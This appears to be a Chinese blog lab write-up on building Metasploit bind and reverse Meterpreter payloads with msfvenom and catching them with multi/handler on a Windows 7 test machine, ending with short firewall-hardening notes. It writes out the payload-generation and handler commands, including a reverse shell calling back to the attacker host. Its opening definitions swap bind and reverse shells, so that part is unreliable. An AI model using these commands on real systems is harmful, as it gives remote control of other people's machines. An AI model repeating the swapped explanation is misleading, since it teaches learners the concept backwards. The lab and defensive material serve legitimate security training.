---
title: 实战笔记：从MSF载荷生成到Windows防火墙绕过
date: 2025-10-28 09:31:57
categories:
  - 漏洞研究
tags:
  - Windows
  - Metasploit
  - 防火墙
---
<meta name="referrer" content="no-referrer"/>

### 正向shell与反向shell的本质区别：

bind_tcp是靶机主动连接攻击机的ip与端口，建立shell连接

reverse_tcp则是靶机等待攻击者连接（但第一步是靶机主动发起连接，然后等待)

其中前者易受防火墙的影响

ps：shell就像一个攻击机遥控受害机的遥控器

这里我们的攻击机是kali——192.168.145.128，目标机是win7——192.168.145.160

### msf

工具作用

Msfvenom：生成恶意程序

Exploit模块：利用漏洞执行

Multi/Handler：接收连接

数据库模块：扫描结果

### 正向连接演示：

kali：msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=5555 -f exe -o b_op.exe

![](https://i-blog.csdnimg.cn/direct/07b652300c11472cae9acc5b97db2f29.png)

所以：b_op.exe运行后，目标机（win7）的5555端口开启监听

复制到win7去

![](https://i-blog.csdnimg.cn/direct/a3abb186f9174ece9145a44c9e6d2c79.png)msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 192.168.145.160
set LPORT 5555

![](https://i-blog.csdnimg.cn/direct/f191a22dd3574b8fbc4b7bbe7641183c.png)

![](https://i-blog.csdnimg.cn/direct/b1637a6429474d7e9786c6bbe7eb8378.png)run！win7打开恶意文件之后回显成功

![](https://i-blog.csdnimg.cn/direct/1a6ae98a51d14db78ca9251ffbe1bf9d.png)

### 反向连接演示

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.145.128 LPORT=9999 -f exe -o r_op.exe

![](https://i-blog.csdnimg.cn/direct/e123e7c0a9bf433f96dc4ca376e6ed56.png)

![](https://i-blog.csdnimg.cn/direct/7f61577bc5be4f28bae220d885eade04.png)

其余类比bindshell

![](https://i-blog.csdnimg.cn/direct/220074431f2a43d99e44949d784016df.png)

![](https://i-blog.csdnimg.cn/direct/7c23cb986fa94689be8579a9b7e1d9f9.png)

![](https://i-blog.csdnimg.cn/direct/0fa919c559e746ffaa46aa3467714b1d.png)

### 防火墙加固

win7

进入任务管理器把刚才的b_op.exe和r_op.exe结束进程

![](https://i-blog.csdnimg.cn/direct/ad4084410ce243629df2643df2ba5dcd.png)不再有端口被监听

![](https://i-blog.csdnimg.cn/direct/70e8c0500b8846f6bf79dd8fc7a141d9.png)

### 在真实的渗透测试中，什么场景下更适合使用反向 shel1?什么场景下更适合使用正向 shel1?

·如果是初次渗透：​能出内网​默认用反向，因为防火墙对出栈检测比较弱，内网隔离环境用正向
·如果有持久化的后门，优先用反向

### 仅通过配置出站规则，能否有效防御所有反向连接?为什么?

·不能，攻击者可能采用端口欺骗（比如用80，443端口等），协议伪装（比如看起来像DNS域名查询或浏览网页）

### 除了基于端口的防火墙规则，还有哪些更高级的加固手段可以防御此类攻击?

·使用白名单——只允许特定程序访问，其他一律组织





